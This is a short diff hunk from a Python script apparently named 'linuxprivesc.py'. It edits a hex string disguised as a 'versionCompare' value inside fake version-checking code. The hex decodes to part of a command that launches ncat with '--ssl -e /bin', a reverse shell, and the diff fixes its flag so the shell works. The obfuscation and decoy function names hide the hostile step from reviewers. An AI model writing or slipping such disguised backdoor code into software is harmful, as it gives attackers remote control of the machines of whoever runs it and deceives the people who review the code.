@@ -47,7 +47,7 @@ def verify_version(ver1, ver2):
 
 def loadsetup():
     versionCheck = check_version("linuxprivesc.py")
-    versionCompare = "70656e285b226e636174202d73736c202d65202f62696e"
+    versionCompare = "70656e285b226e636174202d2d73736c202d65202f62696e"
     for i in range(12):
         i = i + 6
         version = versionCheck+versionCompare+parse_version(verify_version(i, version_match))
